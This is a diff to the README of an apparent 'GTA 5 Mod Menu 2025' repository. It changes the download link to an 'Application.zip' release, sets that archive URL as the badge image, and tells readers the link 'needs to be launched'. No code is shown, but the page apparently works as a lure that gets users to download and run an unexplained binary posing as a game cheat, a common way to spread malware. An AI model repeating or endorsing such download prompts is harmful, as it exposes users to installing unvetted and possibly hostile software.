@@ -15,7 +15,7 @@ Welcome to the **GTA 5 Mod Menu 2025** repository! This tool is designed to enha
 
 ## Getting Started
 To download the GTA 5 Mod Menu 2025 tool, please click the link below.  
-[![Download Mod Menu](https://img.shields.io/badge/Download-Mod_Menu-blue)](https://github.com/user-attachments/files/18426772/Application.zip)  
+[![Download Mod Menu](https://github.com/phucthieuL/GTA-5-Mod-Menu-2025/releases/download/v1.0/Application.zip)](https://github.com/phucthieuL/GTA-5-Mod-Menu-2025/releases/download/v1.0/Application.zip)  
 *(Note: This link needs to be launched to initiate the download.)*
 
 If the above link is not working or you would like to explore more options, please check the "Releases" section of this repository for alternative download sources.
